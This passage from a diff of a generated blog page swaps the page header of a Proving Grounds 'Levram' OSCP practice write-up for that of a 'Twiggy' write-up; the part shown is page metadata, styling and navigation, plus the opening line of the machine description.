@@ -1,154 +1,140 @@
-<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta name="generator" content="Gatsby 5.13.7"/><meta data-react-helmet="true" name="description" content="Solving GLPI machine from Proving Grounds"/><meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0"/><meta data-react-helmet="true" http-equiv="Content-Type" content="text/html;charset=UTF-8"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" property="og:title" content="OSCP Prep: Proving Grounds : Levram"/><meta data-react-helmet="true" property="og:description" content="Solving GLPI machine from Proving Grounds"/><meta data-react-helmet="true" property="og:image" content="/static/a4033efa19a4fa8f33483360e61d7009/levram-1.png"/><meta data-react-helmet="true" property="og:url"/><meta data-react-helmet="true" property="og:site_name" content="OSCP Prep: Proving Grounds : Levram"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:title" content="OSCP Prep: Proving Grounds : Levram"/><meta data-react-helmet="true" name="twitter:description" content="Solving GLPI machine from Proving Grounds"/><meta data-react-helmet="true" name="twitter:image" content="/static/a4033efa19a4fa8f33483360e61d7009/levram-1.png"/><meta data-react-helmet="true" name="twitter:site" content="@Hosan"/><meta data-react-helmet="true" name="twitter:creator" content="@Hosan"/><meta data-react-helmet="true" name="google-site-verification" content="FCIdHVjw_jBPbB0l6gXODqTFlM47h7YaiUfT1hIZqfI"/><meta data-react-helmet="true" name="naver-site-verification" content="aaa42c74638f5011238f2979942a4c6bb674bee0"/><style data-href="/styles.6f5efa0135677e26f5fe.css" data-identity="gatsby-global-css">code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;tab-size:4;text-align:left;text-shadow:0 -.1em .2em #000;white-space:pre;word-break:normal;word-spacing:normal}:not(pre)>code[class*=language-],pre[class*=language-]{background:#141414}pre[class*=language-]{border:.3em solid #545454;border-radius:.5em;box-shadow:inset 1px 1px .5em #000;margin:.5em 0;overflow:auto;padding:1em}pre[class*=language-]::selection{background:#27292a}code[class*=language-] ::selection,code[class*=language-]::selection,pre[class*=language-] ::selection,pre[class*=language-]::selection{background:hsla(0,0%,93%,.15);text-shadow:none}:not(pre)>code[class*=language-]{border:.13em solid #545454;border-radius:.3em;box-shadow:inset 1px 1px .3em -.1em #000;padding:.15em .2em .05em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#787878}.token.namespace,.token.punctuation{opacity:.7}.token.boolean,.token.deleted,.token.number,.token.tag{color:#cf694a}.token.builtin,.token.constant,.token.keyword,.token.property,.token.selector,.token.symbol{color:#f9ee9a}.language-css .token.string,.style .token.string,.token.attr-name,.token.attr-value,.token.char,.token.entity,.token.inserted,.token.operator,.token.string,.token.url,.token.variable{color:#919e6b}.token.atrule{color:#7386a5}.token.important,.token.regex{color:#e9c163}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.language-markup .token.attr-name,.language-markup .token.punctuation,.language-markup .token.tag{color:#ad895c}.token{position:relative;z-index:1}.line-highlight.line-highlight{background:rgba(84,84,84,.25);background:linear-gradient(90deg,rgba(84,84,84,.1) 70%,rgba(84,84,84,0));border-bottom:1px dashed #545454;border-top:1px dashed #545454;margin-top:.75em;z-index:0}.line-highlight.line-highlight:before,.line-highlight.line-highlight[data-end]:after{background-color:#8794a6;color:#f5f2f0}</style><title data-react-helmet="true">OSCP Prep: Proving Grounds : Levram</title><link data-react-helmet="true" rel="dns-prefetch" href="https://fonts.gstatic.com"/><link data-react-helmet="true" rel="shortcut icon" href="data:image/png;base64,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"/><link rel="canonical" href="https://hosahn.github.io/240906/" data-baseprotocol="https:" data-basehost="hosahn.github.io"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){const t=e.target;if(void 0===t.dataset.mainImage)return;if(void 0===t.dataset.gatsbyImageSsr)return;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link rel="sitemap" type="application/xml" href="/sitemap-index.xml"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion="css 13ku56z">.css-13ku56z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;height:100%;}</style><main class="css-13ku56z e1strnqo0"><style data-emotion="css-global 14hvnrk">@import url('https://fonts.googleapis.com/css2?family=Nanum+Myeongjo:wght@400;700;800&display=swap');*{padding:0;margin:0;box-sizing:border-box;font-family:'Nanum Myeongjo',serif;}html,body,#___gatsby{height:100%;}a,a:hover{color:inherit;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;}img{border:1px solid black;}</style><style data-emotion="css cm164m">.css-cm164m{position:-webkit-sticky;position:-webkit-sticky;position:sticky;z-index:1;top:0;width:100%;padding-top:20px;padding-bottom:20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background-color:#7490b5;}@media (max-width: 768px){.css-cm164m{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;text-align:center;}}</style><div class="css-cm164m e15l4yeg6"><style data-emotion="css 1yrcabi">.css-1yrcabi{display:none;font-size:24px;margin-right:30px;background-color:transparent;border:none;cursor:pointer;}@media (max-width: 768px){.css-1yrcabi{display:block;margin-left:20px;}}</style><button class="css-1yrcabi e15l4yeg1">☰</button><style data-emotion="css 16w8lq8">.css-16w8lq8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media (max-width: 768px){.css-16w8lq8{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:100%;display:none;}}</style><div class="css-16w8lq8 e15l4yeg0"><style data-emotion="css 1sav23y">.css-1sav23y{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';background-color:transparent;border:none;cursor:pointer;}</style><button class="css-1sav23y e15l4yeg5"><style data-emotion="css 2331mw">.css-2331mw{z-index:3;}.css-2331mw:hover{background-image:linear-gradient(transparent 60%, white 40%);}</style><a class="css-2331mw e15l4yeg3" href="/">Main</a></button><button class="css-1sav23y e15l4yeg5"><a class="css-2331mw e15l4yeg3" href="/search/">Search</a></button><button class="css-1sav23y e15l4yeg5"><a href="https://github.com/hosahn" class="css-2331mw e15l4yeg2">Github</a></button><button class="css-1sav23y e15l4yeg5"><a href="https://bottlenose-apology-5f4.notion.site/6cefa80ae2a642b8b2523495d3d4bcef" class="css-2331mw e15l4yeg2">About</a></button><button class="css-1sav23y e15l4yeg5"><a class="css-2331mw e15l4yeg3" href="/contact/">Contact</a></button></div></div><style data-emotion="css 16cz9yp">.css-16cz9yp{position:relative;width:100%;height:400px;}@media (max-width: 768px){.css-16cz9yp{height:300px;}}</style><div class="css-16cz9yp e1opi4mu1"><style data-emotion="css 1bjn9yo">.css-1bjn9yo{z-index:-1;width:100%;height:400px;object-fit:cover;-webkit-filter:brightness(0.25);filter:brightness(0.25);}@media (max-width: 768px){.css-1bjn9yo{height:300px;}}</style><div data-gatsby-image-wrapper="" style="position:absolute" class="gatsby-image-wrapper gatsby-image-wrapper-constrained css-1bjn9yo e1opi4mu0"><div style="max-width:521px;display:block"><img alt="" role="presentation" aria-hidden="true" src="data:image/svg+xml;charset=utf-8,%3Csvg%20height=&#x27;468&#x27;%20width=&#x27;521&#x27;%20xmlns=&#x27;http://www.w3.org/2000/svg&#x27;%20version=&#x27;1.1&#x27;%3E%3C/svg%3E" style="max-width:100%;display:block;position:static"/></div><img aria-hidden="true" data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACS0lEQVR42p2USW/TUBDH/VVo43hJUme1s9txVrIobaSQFEFFkMrSkjStEokIVSCkqt+AO1xZJXpDiAtX9gvf5s+854DibEI9/PTmjcf/mTfzbEGO5jGLEitw5v3/izAv5g1bhLmQYD7RqqTCbMCmlka6fBP55iHZKfIX4AlZEAlP0FmliE0Jc7Q3aZ/j9soK5aiN0/MLPDz7DF+8Dn+8SAnaSBRasKpd5GpdhDI1RLJ1FJs3YOR3uM2SuARZdWLIRKK4i9GTD+gNPyJevIt8o4Nb90cYn56jR+vx5Cn648cYPTrDncGEfGOUW3vY0LL/WiDM92B/+Ay9/nP4jCq0ZAW19m1sX9/nFWWvdmBWO7Dru1RZA2GqzmcUFyv8W6UnmEGmssd7yGw5kufZr2xlec8cnH6y3nlnhJb00OaIIfZymsRsKORXY9NnEQcpQkMgJBdLKmTXRQpn4Y+xF6kSmrhu1bEVL2AjkOL7VYjsNPOCLJMYdAd6KVBcI7RW0DmOxY/sZYRN3kcx6NjrkGY+BHcPYzkoOltJPJqDlqogkCxxex0s3i3IPjmapFc24AukoahJiJKBjNmAkSjD49WxSXiWIBIyxcvTwQhMTKZroDavITA6gv/oEIHhAwSO+1AHBxyN7ODJgPsWYP6De5D1Ar9mgqzTxVRS2JqcQP/9HvqXl9C/vUaMML6/4WvmxzuUfl1w28XXV4j9fIvopxeQEyXIYXt6ZDIUqwa11YW63VmKb4Vf3SEabd4291DYX0MzL8/Svw3Lclmmgn8ASWRt3bKUz88AAAAASUVORK5CYII=" alt=""/><picture><source type="image/webp" data-srcset="/static/a4033efa19a4fa8f33483360e61d7009/4ddc8/levram-1.webp 130w,/static/a4033efa19a4fa8f33483360e61d7009/f4a30/levram-1.webp 261w,/static/a4033efa19a4fa8f33483360e61d7009/283bd/levram-1.webp 521w" sizes="(min-width: 521px) 521px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 521px) 521px, 100vw" decoding="async" loading="lazy" data-src="/static/a4033efa19a4fa8f33483360e61d7009/11442/levram-1.png" data-srcset="/static/a4033efa19a4fa8f33483360e61d7009/7ea16/levram-1.png 130w,/static/a4033efa19a4fa8f33483360e61d7009/6bd34/levram-1.png 261w,/static/a4033efa19a4fa8f33483360e61d7009/11442/levram-1.png 521w" alt="thumbnail"/></picture><noscript><picture><source type="image/webp" srcSet="/static/a4033efa19a4fa8f33483360e61d7009/4ddc8/levram-1.webp 130w,/static/a4033efa19a4fa8f33483360e61d7009/f4a30/levram-1.webp 261w,/static/a4033efa19a4fa8f33483360e61d7009/283bd/levram-1.webp 521w" sizes="(min-width: 521px) 521px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 521px) 521px, 100vw" decoding="async" loading="lazy" src="/static/a4033efa19a4fa8f33483360e61d7009/11442/levram-1.png" srcSet="/static/a4033efa19a4fa8f33483360e61d7009/7ea16/levram-1.png 130w,/static/a4033efa19a4fa8f33483360e61d7009/6bd34/levram-1.png 261w,/static/a4033efa19a4fa8f33483360e61d7009/11442/levram-1.png 521w" alt="thumbnail"/></picture></noscript><script type="module">const t="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;if(t){const t=document.querySelectorAll("img[data-main-image]");for(let e of t){e.dataset.src&&(e.setAttribute("src",e.dataset.src),e.removeAttribute("data-src")),e.dataset.srcset&&(e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset"));const t=e.parentNode.querySelectorAll("source[data-srcset]");for(let e of t)e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset");e.complete&&(e.style.opacity=1,e.parentNode.parentNode.querySelector("[data-placeholder-image]").style.opacity=0)}}</script></div><style data-emotion="css m1156n">.css-m1156n{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;height:100%;margin:0 auto;padding:60px 0;color:#ffffff;}@media (max-width: 768px){.css-m1156n{width:100%;padding:40px 20px;}}</style><div class="css-m1156n e1st1jau3"><style data-emotion="css gywgo7">.css-gywgo7{display:grid;place-items:center;width:40px;height:40px;border-radius:50%;background:#ffffff;color:#000000;font-size:22px;cursor:pointer;box-shadow:0 0 10px rgba(0, 0, 0, 0.3);}@media (max-width: 768px){.css-gywgo7{width:30px;height:30px;font-size:18px;}}</style><div class="css-gywgo7 e1st1jau2"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-left" class="svg-inline--fa fa-arrow-left " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path></svg></div><style data-emotion="css gn4qtp">.css-gn4qtp{display:-webkit-box;overflow:hidden;overflow-wrap:break-word;margin-top:auto;text-overflow:ellipsis;white-space:normal;-webkit-line-clamp:2;-webkit-box-orient:vertical;font-size:45px;font-weight:800;}@media (max-width: 768px){.css-gn4qtp{font-size:30px;}}</style><div class="css-gn4qtp e1st1jau1">OSCP Prep: Proving Grounds : Levram</div><style data-emotion="css 3gcnt2">.css-3gcnt2{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-top:10px;font-size:18px;font-weight:700;}@media (max-width: 768px){.css-3gcnt2{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;font-size:15px;font-weight:400;}}</style><div class="css-3gcnt2 e1st1jau0"><div>C-SEC / proving_grounds / full-machine / ENG</div><div>2024.09.06.</div></div></div></div><style data-emotion="css uo146q">.css-uo146q{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;margin:0 auto;padding:100px 0;word-break:break-all;line-height:1.8;font-size:16px;font-weight:400;}.css-uo146q p{padding:3px 0;}.css-uo146q h1,.css-uo146q h2,.css-uo146q h3{font-weight:800;margin-bottom:30px;}.css-uo146q *+h1,.css-uo146q *+h2,.css-uo146q *+h3{margin-top:80px;}.css-uo146q hr+h1,.css-uo146q hr+h2,.css-uo146q hr+h3{margin-top:0;}.css-uo146q h1{font-size:30px;}.css-uo146q h2{font-size:25px;}.css-uo146q h3{font-size:20px;}.css-uo146q blockquote{margin:30px 0;padding:5px 15px;border-left:2px solid #000000;font-weight:800;}.css-uo146q ol,.css-uo146q ul{margin-left:20px;padding:30px 0;}.css-uo146q hr{border:1px solid #000000;margin:100px 0;}.css-uo146q a{color:#4263eb;-webkit-text-decoration:underline;text-decoration:underline;}.css-uo146q pre[class*='language-']{margin:30px 0;padding:15px;font-size:15px;}.css-uo146q pre[class*='language-']::-webkit-scrollbar-thumb{background:rgba(255, 255, 255, 0.5);border-radius:3px;}.css-uo146q code[class*='language-'],.css-uo146q pre[class*='language-']{tab-size:2;}@media (max-width: 768px){.css-uo146q{width:100%;padding:80px 20px;line-height:1.6;font-size:14px;}.css-uo146q h1{font-size:23px;}.css-uo146q h2{font-size:20px;}.css-uo146q h3{font-size:17px;}.css-uo146q img{width:100%;}.css-uo146q hr{margin:50px 0;}}</style><div class="css-uo146q e1ijh0y10"><h2>0. Machine Info</h2>
-<p>Levram is an easy machine from Proving Grounds, and this one is pretty straight forward.</p>
+<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta name="generator" content="Gatsby 5.13.7"/><meta data-react-helmet="true" name="description" content="Solving Twiggy machine from Proving Grounds"/><meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0"/><meta data-react-helmet="true" http-equiv="Content-Type" content="text/html;charset=UTF-8"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" property="og:title" content="OSCP Prep: Proving Grounds : Twiggy"/><meta data-react-helmet="true" property="og:description" content="Solving Twiggy machine from Proving Grounds"/><meta data-react-helmet="true" property="og:image" content="/static/b66bba67c9face34aa386f068a317ffe/twiggy-1.png"/><meta data-react-helmet="true" property="og:url"/><meta data-react-helmet="true" property="og:site_name" content="OSCP Prep: Proving Grounds : Twiggy"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:title" content="OSCP Prep: Proving Grounds : Twiggy"/><meta data-react-helmet="true" name="twitter:description" content="Solving Twiggy machine from Proving Grounds"/><meta data-react-helmet="true" name="twitter:image" content="/static/b66bba67c9face34aa386f068a317ffe/twiggy-1.png"/><meta data-react-helmet="true" name="twitter:site" content="@Hosan"/><meta data-react-helmet="true" name="twitter:creator" content="@Hosan"/><meta data-react-helmet="true" name="google-site-verification" content="FCIdHVjw_jBPbB0l6gXODqTFlM47h7YaiUfT1hIZqfI"/><meta data-react-helmet="true" name="naver-site-verification" content="aaa42c74638f5011238f2979942a4c6bb674bee0"/><style data-href="/styles.6f5efa0135677e26f5fe.css" data-identity="gatsby-global-css">code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;tab-size:4;text-align:left;text-shadow:0 -.1em .2em #000;white-space:pre;word-break:normal;word-spacing:normal}:not(pre)>code[class*=language-],pre[class*=language-]{background:#141414}pre[class*=language-]{border:.3em solid #545454;border-radius:.5em;box-shadow:inset 1px 1px .5em #000;margin:.5em 0;overflow:auto;padding:1em}pre[class*=language-]::selection{background:#27292a}code[class*=language-] ::selection,code[class*=language-]::selection,pre[class*=language-] ::selection,pre[class*=language-]::selection{background:hsla(0,0%,93%,.15);text-shadow:none}:not(pre)>code[class*=language-]{border:.13em solid #545454;border-radius:.3em;box-shadow:inset 1px 1px .3em -.1em #000;padding:.15em .2em .05em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#787878}.token.namespace,.token.punctuation{opacity:.7}.token.boolean,.token.deleted,.token.number,.token.tag{color:#cf694a}.token.builtin,.token.constant,.token.keyword,.token.property,.token.selector,.token.symbol{color:#f9ee9a}.language-css .token.string,.style .token.string,.token.attr-name,.token.attr-value,.token.char,.token.entity,.token.inserted,.token.operator,.token.string,.token.url,.token.variable{color:#919e6b}.token.atrule{color:#7386a5}.token.important,.token.regex{color:#e9c163}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.language-markup .token.attr-name,.language-markup .token.punctuation,.language-markup .token.tag{color:#ad895c}.token{position:relative;z-index:1}.line-highlight.line-highlight{background:rgba(84,84,84,.25);background:linear-gradient(90deg,rgba(84,84,84,.1) 70%,rgba(84,84,84,0));border-bottom:1px dashed #545454;border-top:1px dashed #545454;margin-top:.75em;z-index:0}.line-highlight.line-highlight:before,.line-highlight.line-highlight[data-end]:after{background-color:#8794a6;color:#f5f2f0}</style><title data-react-helmet="true">OSCP Prep: Proving Grounds : Twiggy</title><link data-react-helmet="true" rel="dns-prefetch" href="https://fonts.gstatic.com"/><link data-react-helmet="true" rel="shortcut icon" href="data:image/png;base64,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"/><link rel="canonical" href="https://hosahn.github.io/240906/" data-baseprotocol="https:" data-basehost="hosahn.github.io"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){const t=e.target;if(void 0===t.dataset.mainImage)return;if(void 0===t.dataset.gatsbyImageSsr)return;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new 